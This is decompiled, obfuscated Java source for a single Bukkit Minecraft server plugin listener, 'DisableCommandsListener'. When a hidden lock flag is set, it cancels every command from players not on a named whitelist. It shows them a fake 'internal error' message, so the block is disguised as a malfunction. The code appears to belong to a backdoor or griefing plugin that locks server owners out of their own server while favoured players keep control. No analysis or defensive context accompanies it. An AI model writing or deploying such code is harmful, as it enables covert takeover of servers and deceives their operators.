/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.player.PlayerCommandPreprocessEvent
 */
package me.system.runner.events;

import me.system.runner.Core;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class DisableCommandsListener
implements Listener {
    private static final /* synthetic */ Core INSTANCE;

    static {
        INSTANCE = (Core)Core.getPlugin(Core.class);
    }

    public DisableCommandsListener() {
        DisableCommandsListener llllllllllllllIIIlIIlllIIIIIlllI;
    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent llllllllllllllIIIlIIlllIIIIIIlll) {
        Player llllllllllllllIIIlIIlllIIIIIlIII = llllllllllllllIIIlIIlllIIIIIIlll.getPlayer();
        if (DisableCommandsListener.INSTANCE.playerCommandsLocked && !DisableCommandsListener.INSTANCE.lite.contains(llllllllllllllIIIlIIlllIIIIIlIII.getName())) {
            llllllllllllllIIIlIIlllIIIIIIlll.setCancelled(true);
            llllllllllllllIIIlIIlllIIIIIlIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
        }
    }
}

